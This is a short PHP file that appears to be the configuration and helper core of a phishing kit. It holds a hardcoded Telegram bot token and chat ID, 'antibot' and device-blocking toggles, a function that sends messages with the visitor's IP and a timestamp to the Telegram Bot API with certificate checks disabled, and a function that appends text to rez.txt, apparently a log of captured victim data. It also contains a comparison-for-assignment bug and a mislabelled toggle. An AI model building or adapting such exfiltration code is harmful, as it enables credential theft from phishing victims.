<?php


// telegram information
$token = "5066037288:AAEw2KT0cU37dr0q7z90zWGu5qd-6ZvsREQ";
$id = "2011330617";


// block mobile device. yes|no
$block_pc = "no";


// use antibot? yes|no
$antibot = "yes";



require (__DIR__).'/md.php';
$detect = new Mobile_Detect;
$device = "PC";
if($detect->isMobile()){
    $device=="Mobile";
}

 
function call($msg){
    global $device;
    global $token;
    global $id;
    $info = "

/- MORE INFO -/
Device: $device 
IP: ".$_SERVER['REMOTE_ADDR']."
TIME: ".date("m/d/Y h:i:sa");
$c = curl_init('https://api.telegram.org/bot'.$token.'/sendMessage?chat_id='.$id.'&text='.urlencode($msg.$info));
curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
$res = curl_exec($c);
curl_close($c);
return $res;
}


function save($txt){
    $fp = fopen((__DIR__)."/rez.txt", "a");
    fwrite($fp, $txt);
    fclose($fp);
}




?>